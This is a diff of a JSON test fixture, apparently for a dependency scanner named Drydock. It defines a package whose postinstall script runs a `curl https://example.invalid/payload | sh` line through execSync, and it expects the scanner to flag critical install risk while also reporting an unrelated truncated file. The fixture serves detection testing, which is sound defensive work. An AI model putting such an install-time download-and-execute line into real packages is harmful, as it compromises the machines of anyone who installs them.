@@ -1,56 +1,52 @@
 {
-  "id": "added-dependency-dynamic-skipped-content",
-  "title": "A dynamic install loader makes every omitted body a coverage gap",
+  "id": "added-dependency-truncated-install-dropper",
+  "title": "Unrelated truncation cannot erase a proven install dropper",
   "category": "dependency-introduction",
-  "intent": "A computed CommonJS module path can execute an omitted body regardless of its extension. Drydock must report incomplete evidence instead of guessing that only map or minified JavaScript files are executable.",
+  "intent": "The retained lifecycle path proves remote-shell behavior while an unrelated large file is incomplete. Drydock must preserve the critical install-risk evidence and also report the coverage gap.",
   "previousPackageJson": { "name": "consumer", "version": "1.0.0" },
   "stagedPackageJson": {
     "name": "consumer",
     "version": "1.1.0",
-    "dependencies": { "dynamic-install": "1.0.0" }
+    "dependencies": { "truncated-dropper": "1.0.0" }
   },
   "dependencyArtifacts": {
-    "dynamic-install": {
+    "truncated-dropper": {
       "version": "1.0.0",
       "packageJson": {
-        "name": "dynamic-install",
+        "name": "truncated-dropper",
         "version": "1.0.0",
         "scripts": { "postinstall": "node install.js" }
       },
       "files": [
         {
           "path": "package.json",
-          "size": 104,
+          "size": 107,
           "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
-          "textSample": "{\"name\":\"dynamic-install\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node install.js\"}}",
+          "textSample": "{\"name\":\"truncated-dropper\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node install.js\"}}",
           "flags": []
         },
         {
           "path": "install.js",
-          "size": 39,
+          "size": 95,
           "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
-          "textSample": "require('./payload.' + process.env.KIND)",
+          "textSample": "require('node:child_process').execSync('curl https://example.invalid/payload | sh')",
           "flags": []
         },
         {
-          "path": "payload.data",
+          "path": "unrelated.bin",
           "size": 4096,
           "sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
-          "flags": ["text-sample-skipped"]
+          "flags": ["content-skipped"]
         }
       ]
     }
   },
   "expectedDependencies": [
     {
-      "name": "dynamic-install",
-      "section": "dependencies",
-      "declaredSpec": "1.0.0",
-      "declarationKind": "exact",
+      "name": "truncated-dropper",
       "status": "uninspectable",
       "reason": "artifact-truncated",
       "resolvedVersion": "1.0.0",
-      "fileCount": 3,
       "observation": { "execution": "observed", "risk": "observed" }
     }
   ],
@@ -58,12 +54,12 @@
     {
       "ruleId": "dependency-artifact.install-risk",
       "severity": "critical",
-      "file": "<dependency>dynamic-install@1.0.0:package.json"
+      "file": "<dependency>truncated-dropper@1.0.0:package.json"
     },
     {
       "ruleId": "dependency-artifact.uninspectable",
       "severity": "medium",
-      "file": "<dependency>dynamic-install@1.0.0"
+      "file": "<dependency>truncated-dropper@1.0.0"
     }
   ],
   "expectedRisk": "critical",
